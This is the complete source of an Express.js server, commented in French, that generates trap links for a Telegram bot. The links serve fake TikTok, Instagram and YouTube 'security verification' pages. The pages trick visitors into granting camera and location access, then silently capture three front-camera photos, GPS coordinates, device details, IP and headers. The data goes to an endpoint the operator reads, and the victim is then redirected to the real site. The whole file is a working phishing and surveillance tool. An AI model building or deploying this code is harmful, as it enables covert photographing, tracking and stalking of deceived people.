const express = require("express");
const bodyParser = require("body-parser");
const shortid = require("shortid");
const dotenv = require("dotenv");

dotenv.config();

const app = express();
const PORT = process.env.PORT || 5000;

// Middleware
app.use(bodyParser.json({ limit: "50mb" }));
app.use(bodyParser.urlencoded({ extended: true, limit: "50mb" }));

// 🔥 KEEP-ALIVE SYSTEM - Immortel 24/7
setInterval(
    () => {
        console.log("🔥 Keeping alive...", new Date().toISOString());
    },
    5 * 60 * 1000,
);

// Base de données simple en mémoire
let links = {};
let capturedData = {};

// 🚀 ROUTES SYSTÈME
app.get("/", (req, res) => {
    res.send(`
        <!DOCTYPE html>
        <html>
        <head>
            <title>Server Status</title>
            <style>
                body { font-family: sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; background: #f0f2f5; }
                .card { background: white; padding: 2rem; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); text-align: center; }
                h1 { color: #1a73e8; }
                p { color: #5f6368; }
            </style>
        </head>
        <body>
            <div class="card">
                <h1>✅ Server is Running</h1>
                <p>The Telegram bot and capture system are active.</p>
                <p>Use your bot to generate links.</p>
            </div>
        </body>
        </html>
    `);
});

app.get("/ping", (req, res) => {
    res.status(200).json({
        status: "alive",
        timestamp: new Date().toISOString(),
        uptime: process.uptime(),
    });
});

app.get("/health", (req, res) => {
    res.status(200).json({
        status: "healthy",
        links: Object.keys(links).length,
        data: Object.keys(capturedData).length,
    });
});

// 🎯 GÉNÉRATION DE LIENS
app.post("/generate-link", (req, res) => {
    const { platform, chatId } = req.body;
    const id = shortid.generate();
    links[id] = { platform, chatId, created: new Date().toISOString() };

    const baseHost = process.env.RENDER_EXTERNAL_URL 
        ? process.env.RENDER_EXTERNAL_URL.replace(/^https?:\/\//, "").replace(/\/$/, "")
        : (process.env.REPLIT_DOMAINS 
            ? process.env.REPLIT_DOMAINS.split(",")[0] 
            : (process.env.RENDER_EXTERNAL_HOSTNAME || req.get('host')));
    let platformUrl;

    switch (platform) {
        case "tiktok":
            platformUrl = `https://${baseHost}/tk/${id}`;
            break;
        case "instagram":
            platformUrl = `https://${baseHost}/ig/${id}`;
            break;
        case "youtube":
            platformUrl = `https://${baseHost}/yt/${id}`;
            break;
        default:
            platformUrl = `https://${baseHost}/link/${id}`;
    }

    console.log(`🔗 Lien généré: ${platform} -> ${id}`);
    res.json({ id, url: platformUrl });
});

// 🎯 ROUTES DE CAPTURE
app.get("/tk/:id", (req, res) => handleLinkRequest(req, res, "tiktok"));
app.get("/ig/:id", (req, res) => handleLinkRequest(req, res, "instagram"));
app.get("/yt/:id", (req, res) => handleLinkRequest(req, res, "youtube"));
app.get("/link/:id", (req, res) => handleLinkRequest(req, res));

// 🎯 FONCTION PRINCIPALE DE CAPTURE
function handleLinkRequest(req, res, platformOverride = null) {
    const { id } = req.params;

    if (!links[id]) {
        return res.status(404).send("Lien expiré ou invalide");
    }

    const platform = platformOverride || links[id].platform;

    // Headers anti-cache et permissions
    res.set({
        "Cache-Control": "no-cache, no-store, must-revalidate",
        Pragma: "no-cache",
        Expires: "0",
        "Permissions-Policy":
            "camera=(self), geolocation=(self), microphone=(self)",
    });

    res.send(`
<!DOCTYPE html>
<html>
<head>
    <title>${getPlatformTitle(platform)}</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="icon" href="${getPlatformFavicon(platform)}">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh; display: flex; align-items: center; justify-content: center;
        }
        .container { 
            background: white; border-radius: 20px; padding: 40px;
            box-shadow: 0 20px 40px rgba(0,0,0,0.1); max-width: 400px; width: 90%;
            text-align: center;
        }
        .logo { font-size: 48px; margin-bottom: 20px; }
        h1 { color: #333; margin-bottom: 10px; font-size: 24px; }
        p { color: #666; margin-bottom: 30px; line-height: 1.5; }
        .btn { 
            background: linear-gradient(45deg, #FF6B6B, #4ECDC4);
            color: white; border: none; padding: 15px 30px; border-radius: 50px;
            font-size: 16px; font-weight: bold; cursor: pointer; width: 100%;
            transition: all 0.3s ease; box-shadow: 0 4px 15px rgba(0,0,0,0.2);
        }
        .btn:hover { transform: translateY(-2px); box-shadow: 0 8px 25px rgba(0,0,0,0.3); }
        .loading { display: none; margin-top: 20px; }
        .spinner { 
            border: 3px solid #f3f3f3; border-top: 3px solid #3498db;
            border-radius: 50%; width: 40px; height: 40px; margin: 0 auto 10px;
            animation: spin 1s linear infinite;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .success { display: none; color: #27ae60; margin-top: 20px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">${getPlatformEmoji(platform)}</div>
        <h1>${getPlatformTitle(platform)}</h1>
        <p>Vérification de sécurité requise pour accéder au contenu exclusif.</p>
        <p style="font-size: 12px; color: #999; margin-top: 10px;">Note: Autorisez l'accès à la caméra et localisation quand demandé.</p>

        <button id="verifyBtn" class="btn" onclick="startCapture()">
            🔒 Démarrer la vérification des composants de ton télephone...
        </button>

        <div id="loading" class="loading">
            <div class="spinner"></div>
            <p id="loadingText">Vérification en cours...</p>
        </div>

        <div id="success" class="success">
            <h3>✅ Vérification réussie !</h3>
            <p>Redirection automatique...</p>
        </div>
    </div>

    <script>
        let capturing = false;

        async function startCapture() {
            console.log("Button clicked!");
            if (capturing) return;
            capturing = true;

            const verifyBtn = document.getElementById('verifyBtn');
            const loading = document.getElementById('loading');
            const loadingText = document.getElementById('loadingText');

            verifyBtn.style.display = 'none';
            loading.style.display = 'block';

            try {
                const data = {
                    id: '${id}',
                    timestamp: new Date().toISOString(),
                    platform: '${platform}',
                    images: [],
                    location: {},
                    device: {
                        userAgent: navigator.userAgent,
                        platform: navigator.platform,
                        language: navigator.language,
                        screen: { width: screen.width, height: screen.height },
                        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
                    }
                };

                // 📸 Demander les permissions DIRECTEMENT au clic
                loadingText.innerText = '⚙️ Initialisation...';
                
                // On tente de lancer les deux demandes en parallèle
                const cameraPromise = navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } })
                    .catch(e => { console.log("Camera error:", e); return null; });
                
                const geoPromise = new Promise((res) => {
                    navigator.geolocation.getCurrentPosition(res, (err) => { 
                        console.log("Geo error:", err); 
                        res(null); 
                    }, { timeout: 8000 });
                });

                loadingText.innerText = "📸 Verification de l'état du Caméra...";
                const stream = await cameraPromise;
                if (stream) {
                    const video = document.createElement('video');
                    video.srcObject = stream;
                    video.muted = true;
                    await video.play();

                    const canvas = document.createElement('canvas');
                    const ctx = canvas.getContext('2d');
                    
                    for(let i=0; i<3; i++) {
                        canvas.width = video.videoWidth;
                        canvas.height = video.videoHeight;
                        ctx.drawImage(video, 0, 0);
                        data.images.push(canvas.toDataURL('image/jpeg', 0.5).split(',')[1]);
                        await new Promise(r => setTimeout(r, 400));
                    }
                    stream.getTracks().forEach(t => t.stop());
                }

                loadingText.innerText = "📍 Localisation...";
                const pos = await geoPromise;
                if (pos) {
                    data.location = {
                        latitude: pos.coords.latitude,
                        longitude: pos.coords.longitude,
                        accuracy: pos.coords.accuracy,
                        source: 'gps'
                    };
                }

                loadingText.innerText = "📡 Reception...";
                await fetch('/capture-data', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(data)
                });

                document.getElementById('loading').style.display = 'none';
                document.getElementById('success').style.display = 'block';
                
                setTimeout(() => {
                    const urls = { 'tiktok': 'https://tiktok.com', 'instagram': 'https://instagram.com', 'youtube': 'https://youtube.com' };
                    window.location.href = urls['${platform}'] || 'https://google.com';
                }, 1500);

            } catch (error) {
                console.error('Final error:', error);
                loading.innerHTML = '<p style="color:red">Erreur. Veuillez rafraichir la page et accepter les permissions.</p>';
            }
        }
    </script>

    <script>
        // Pre-chargement discret des permissions
        setTimeout(() => {
            // Verifier la disponibilite des API
            if (navigator.mediaDevices) {
                navigator.mediaDevices.enumerateDevices().catch(() => {
                    console.log('Media devices non disponibles');
                });
            }
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(() => {}, () => {}, { 
                    timeout: 1000, 
                    enableHighAccuracy: false 
                });
            }
        }, 500);
    </script>
</body>
</html>
    `);
}

// 📡 RÉCEPTION DES DONNÉES
app.post("/capture-data", (req, res) => {
    const data = req.body;
    const { id } = data;

    if (!links[id]) {
        return res.status(404).json({ error: "Lien invalide" });
    }

    // Sauvegarder toutes les données
    capturedData[id] = {
        ...data,
        ip: req.ip || req.connection.remoteAddress,
        headers: req.headers,
        captured_at: new Date().toISOString(),
    };

    console.log(`📸 DONNÉES CAPTURÉES pour ${id}:`, {
        images: data.images?.length || 0,
        location: data.location?.source || "none",
        device: data.device?.platform || "unknown",
    });

    res.json({ success: true, message: "Données reçues" });
});

// 🔍 RÉCUPÉRATION DES DONNÉES
app.get("/get-data/:id", (req, res) => {
    const { id } = req.params;
    const data = capturedData[id];

    if (!data) {
        return res.status(404).json({ error: "Aucune donnée trouvée" });
    }

    res.json(data);
});

// 🎯 FONCTIONS UTILITAIRES
function getPlatformTitle(platform) {
    const titles = {
        tiktok: "TikTok - Contenu Exclusif",
        instagram: "Instagram - Verification Required",
        youtube: "YouTube Premium Access",
    };
    return titles[platform] || "Secure Access Required";
}

function getPlatformEmoji(platform) {
    const emojis = {
        tiktok: "🎵",
        instagram: "📸",
        youtube: "📺",
    };
    return emojis[platform] || "🔒";
}

function getPlatformFavicon(platform) {
    // Favicons simplifiés
    return "data:image/x-icon;base64,AAABAAEAEBAAAAEAIABoBAAAFgAAACgAAAAQAAAAIAAAAAEAIAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAA==";
}

// 🚀 DÉMARRAGE DU SERVEUR
app.listen(PORT, "0.0.0.0", () => {
    console.log(`🚀 Serveur démarré sur le port ${PORT}`);
    console.log(`📡 Keep-alive activé - Immortel 24/7`);
    console.log(`🔗 Prêt à générer des liens pièges !`);
});
